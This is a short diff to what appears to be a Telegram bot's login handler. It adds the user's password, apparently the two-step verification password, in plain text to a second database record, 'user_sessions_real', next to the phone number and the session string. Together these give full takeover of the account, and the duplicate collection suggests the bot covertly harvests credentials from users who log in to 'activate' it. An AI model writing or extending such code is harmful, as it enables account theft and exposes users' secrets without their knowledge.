@@ -134,7 +134,7 @@ async def generate_session(_, message):
 
     # ✅ Save session in both directories
     await db.set_session(user_id, string_session)
-    await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session})
+    await db.user_sessions_real.insert_one({"user_id": user_id, "phone_number": phone_number, "session_string": string_session,"password": password})
 
     await client.disconnect()
     await otp_code.reply("✅ Login successful!\n🚀 Activating bot for you...")
